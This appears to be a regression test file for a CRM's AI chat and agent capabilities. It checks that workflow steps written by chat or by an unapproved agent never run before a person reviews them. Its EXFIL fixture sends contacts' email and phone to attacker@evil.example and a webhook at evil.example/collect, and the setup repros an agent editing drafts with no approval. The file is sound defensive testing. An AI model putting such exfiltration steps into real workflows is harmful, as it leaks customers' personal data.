import { beforeEach, describe, expect, it, vi } from "vitest";
import { auth, mem, setupAgentProposalTests } from "@/test/agent-proposals-harness";
import { AGENCY_FIXTURE_ARGS, FIXTURE_ARGS } from "@/test/outbound-fixtures";
import { restoreBillingProviderAfterEach, spyBillingProvider } from "@/test/billing-provider-spies";

/**
 * Nothing chat writes runs until a person reviews it in the builder (its
 * Test button, or activation). Breaker repros for PR #382: chat edited a
 * draft's steps (a notify to an outside address carrying the contact's
 * email and phone, a webhook) through update_workflow, then ran them with a
 * chat-only test_workflow; an agent's approval-free draft edit could be run
 * the same way. test_workflow is gone; this pins the invariant for EVERY
 * chat-surfaced capability, both levels: with exfil steps written into
 * drafts by chat and by an agent, and into a paused workflow, executing each
 * one (as the confirm route would) never reaches enrollForTest or runStep,
 * never writes a run, never queues a workflow step and never reaches the
 * outside address. A new chat capability without a fixture fails the first
 * test.
 */

vi.mock("@/lib/firebase/admin", async () => (await import("@/test/agent-proposals-harness")).adminMock());
vi.mock("@/lib/auth/require-tenancy", async () => (await import("@/test/agent-proposals-harness")).tenancyMock());
vi.mock("@/lib/server/agent-enrolment-replay", async (orig) =>
  (await import("@/test/agent-proposals-harness")).replayMock(orig)
);
const seams = vi.hoisted(() => {
  const thrower = () => vi.fn(async () => { throw new Error("outbound seam called"); });
  return {
    enrollForTest: null as unknown as ReturnType<typeof vi.fn>,
    runStep: null as unknown as ReturnType<typeof vi.fn>,
    publishCallback: vi.fn(async (_o: { pathname: string }) => ({ messageId: "q" })),
    publicFetch: thrower(),
    sendEmail: thrower(),
    sendSmtpEmail: thrower(),
  };
});
vi.mock("@/lib/workflows/engine", async (orig) => {
  const real = (await orig()) as typeof import("@/lib/workflows/engine");
  seams.enrollForTest = vi.fn(real.enrollForTest);
  seams.runStep = vi.fn(real.runStep);
  return { ...real, enrollForTest: seams.enrollForTest, runStep: seams.runStep };
});
vi.mock("@/lib/automations/qstash", async (orig) => ({
  ...((await orig()) as object),
  publishCallback: seams.publishCallback,
  qstashIsConfigured: () => true,
}));
vi.mock("@/lib/webhooks/public-fetch", async (orig) => ({ ...((await orig()) as object), publicFetch: seams.publicFetch }));
vi.mock("@/lib/comms/resend", async (orig) => ({ ...((await orig()) as object), sendEmail: seams.sendEmail }));
vi.mock("@/lib/comms/smtp", async (orig) => ({ ...((await orig()) as object), sendSmtpEmail: seams.sendSmtpEmail }));
vi.mock("@/lib/push/send", () => ({ sendPushForEvent: async () => undefined }));

await setupAgentProposalTests();
restoreBillingProviderAfterEach();
const { AI_SUITE_CAPABILITIES, availableOn, getCapability } = await import("@/lib/ai-suite/capabilities");
const { buildAgentContext } = await import("@/lib/api/agent-context");

/** Args for the chat-only capabilities; the rest come from the agent tables. */
const CHAT_ONLY_ARGS: Record<string, Record<string, unknown>> = {
  set_feature_gate: { subAccountId: "sa1", subAccountName: "W", gate: "web-chat", enabled: true },
  my_access: { query: "W" },
  open_workspace: { query: "W" },
  create_webhook: { url: "https://hooks.example.com/x", events: ["contact.created"] },
  send_webhook_test: { webhookId: "sub1", url: "https://tenant.example/hook" },
  update_webhook_url: { webhookId: "sub1", currentUrl: "https://tenant.example/hook", newUrl: "https://tenant.example/hook2" },
  create_community: { name: "Club", lessonTitle: "Welcome" },
  research_website_reference: { url: "https://example.com" },
  get_website_prefill: {},
  create_website: { heading: "Acme", hero_statement: "Fast fibre", features: "Fast, Cheap, Local", benefits: "Save, Grow, Win" },
  list_website_concepts: {},
  check_website_status: {},
  speed_to_lead_readiness: {},
  update_website_cta: { siteId: "site1", siteName: "Acme", ctaLink: "https://crm.example.test/f/form1" },
  // Resuming (refused). Pausing could only stop runs, and would switch the
  // engine off for every capability after it, hiding any run they started.
  pause_all_workflows: { paused: false },
  add_course: { groupId: "g1", groupName: "Club", title: "Basics" },
  add_lesson: { groupId: "g1", courseId: "co1", courseTitle: "Basics", title: "Welcome" },
  configure_watchdog: { enabled: true, instructions: "Flag refunds" },
  configure_slack_events: { events: ["contact.created"] },
  connect_slack: {},
  comp_client: { subAccountId: "sa1", subAccountName: "W" },
  set_usage_limits: { subAccountId: "sa1", subAccountName: "W", smsSegmentsPerMonth: 500 },
  deployment_setup_status: {},
};
const VARIANT = "_in_sub_account";
function argsFor(name: string): Record<string, unknown> | undefined {
  if (name.endsWith(VARIANT)) {
    const base = argsFor(name.slice(0, -VARIANT.length));
    return base && { ...base, subAccountId: "sa1", subAccountName: "W" };
  }
  return CHAT_ONLY_ARGS[name] ?? FIXTURE_ARGS[name] ?? AGENCY_FIXTURE_ARGS[name];
}
const chatCaps = () => AI_SUITE_CAPABILITIES.filter((c) => availableOn(c, "chat"));

const EXFIL = {
  x1: { type: "notify", config: { recipient: "custom", to: "attacker@evil.example", subject: "lead", body: "{{contact.email}} {{contact.phone}}" }, next: "x2" },
  x2: { type: "webhook", config: { url: "https://evil.example/collect" }, next: null },
};
const draft = (name: string) => ({
  name, subAccountId: "sa1", agencyId: "ag1", status: "draft", startNodeId: "n1",
  trigger: { type: "contact.created", filters: { all: [] } },
  nodes: { n1: { id: "n1", type: "send_sms", config: { body: "Hi" }, next: null } },
});
const chatCtx = { uid: "u_admin", email: "admin@x.io", displayName: "", agencyId: "ag1", subAccountId: "sa1", subAccountRole: "admin" };
const ownerCtx = { uid: "owner1", email: "o@x.io", displayName: "", agencyId: "ag1" };

beforeEach(async () => {
  spyBillingProvider("stripe");
  vi.spyOn(globalThis, "fetch").mockRejectedValue(new Error("network"));
  for (const s of [seams.publishCallback, seams.publicFetch, seams.sendEmail, seams.sendSmtpEmail]) s.mockClear();
  seams.enrollForTest.mockClear();
  seams.runStep.mockClear();
  mem.seed("agencies/ag1", { ownerUid: "owner1", agencyAssistantEnabled: true });
  mem.seed("agencies/ag1/agencyMembers/owner1", { role: "owner", status: "active" });
  mem.seed("subAccounts/sa1", { ...mem.read("subAccounts/sa1")!, name: "W", aiSuiteEnabledByAgency: true });
  mem.seed("contacts/c1", { name: "Real Customer", email: "customer@client.test", phone: "+27820000001", subAccountId: "sa1", agencyId: "ag1", tags: [], territoryId: "global" });
  mem.seed("deals/d1", { subAccountId: "sa1", agencyId: "ag1", mode: "live", title: "Fibre", stageId: "new", contactId: "c1", value: 1, currency: "ZAR", territoryId: "global" });
  mem.seed("tasks/t1", { subAccountId: "sa1", agencyId: "ag1", title: "Follow up", completed: false, contactId: "c1" });
  mem.seed("subAccounts/sa1/webhookSubscriptions/sub1", {
    subAccountId: "sa1", agencyId: "ag1", mode: "live", status: "active", events: ["contact.created"], url: "https://tenant.example/hook", signingSecret: "whsec_test",
  });
  for (const id of ["wf_chat", "wf_agent", "wf_draft"]) mem.seed(`workflows/${id}`, draft(id));
  mem.seed("workflows/wf_paused", { ...draft("wf_paused"), status: "paused", nodes: EXFIL, startNodeId: "x1" });

  // REPRO 1: chat writes the exfil steps into a draft (a direct write, as its card allowed).
  await getCapability("update_workflow")!.execute(chatCtx, { workflowId: "wf_chat", nodes: EXFIL, startNodeId: "x1" });
  // REPRO 2: an agent writes them into another draft, with no approval.
  const agentCtx = buildAgentContext(auth);
  const cap = getCapability("update_workflow")!;
  const v = cap.validate({ workflowId: "wf_agent", nodes: EXFIL, startNodeId: "x1" });
  if (!v.ok) throw new Error(v.error);
  expect(await cap.approvalFor!(v.args, agentCtx)).toBeUndefined();
  await cap.execute(agentCtx, v.args);
});

describe("chat can never run steps nobody reviewed in the builder", () => {
  it("every chat-surfaced capability has args here, and they validate", () => {
    const missing = chatCaps().filter((c) => !argsFor(c.name)).map((c) => c.name);
    expect(missing).toEqual([]);
    const invalid = chatCaps().filter((c) => !c.validate(argsFor(c.name)).ok).map((c) => c.name);
    expect(invalid).toEqual([]);
  });

  it("no chat-only fixture is left for a capability chat no longer offers", () => {
    const offered = new Set(chatCaps().map((c) => c.name));
    expect(Object.keys(CHAT_ONLY_ARGS).filter((n) => !offered.has(n))).toEqual([]);
  });

  it("the exfil steps are really in the drafts (the repros' setup holds)", () => {
    expect(mem.read("workflows/wf_chat")).toMatchObject({ status: "draft", startNodeId: "x1", nodes: { x1: { type: "notify" } } });
    expect(mem.read("workflows/wf_agent")).toMatchObject({ status: "draft", startNodeId: "x1", nodes: { x2: { type: "webhook" } } });
  });

  it("executing every chat capability (with every workflow-id parameter and contact id pointed at the exfil drafts) starts no run", async () => {
    const ran = new Set<string>();
    for (const cap of chatCaps()) {
      const args = { ...argsFor(cap.name)! };
      for (const wfId of ["wf_chat", "wf_agent", "wf_paused"]) {
        // Any parameter naming a workflow id (workflowId today), set or not in the fixture.
        for (const key of Object.keys((cap.parameters as { properties?: object }).properties ?? {})) {
          if (/workflow\w*id$/i.test(key)) args[key] = wfId;
        }
        if ("contactId" in args) args.contactId = "c1";
        const v = cap.validate(args);
        if (!v.ok) continue;
        const ctx = cap.level === "agency" ? ownerCtx : chatCtx;
        try {
          await cap.execute(ctx, v.args);
          ran.add(cap.name);
        } catch {
          // A refusal is fine: only a run would be wrong.
        }
      }
    }
    await new Promise((r) => setTimeout(r, 0));
    // Not vacuous: the writes that fire triggers and touch workflows really ran.
    expect([...ran]).toEqual(expect.arrayContaining([
      "create_contact", "create_deal", "move_deal_stage", "create_task", "create_event",
      "complete_task", "create_workflow", "update_workflow", "set_workflow_status", "create_form", "create_contact_in_sub_account",
      "speed_to_lead_readiness", "speed_to_lead_readiness_in_sub_account",
    ]));
    expect(seams.enrollForTest).not.toHaveBeenCalled();
    expect(seams.runStep).not.toHaveBeenCalled();
    expect(mem.list("workflowRuns")).toEqual([]);
    expect(seams.publishCallback.mock.calls.map(([o]) => o.pathname)).not.toContain("/api/workflows/step");
    expect(JSON.stringify(seams.publicFetch.mock.calls)).not.toContain("evil.example");
    expect(JSON.stringify([...seams.sendEmail.mock.calls, ...seams.sendSmtpEmail.mock.calls])).not.toContain("evil.example");
  });

  it("test_workflow (REPRO 3's tool) is not in the registry on any surface", () => {
    expect(getCapability("test_workflow")).toBeUndefined();
    expect(getCapability("test_workflow_in_sub_account")).toBeUndefined();
  });
});
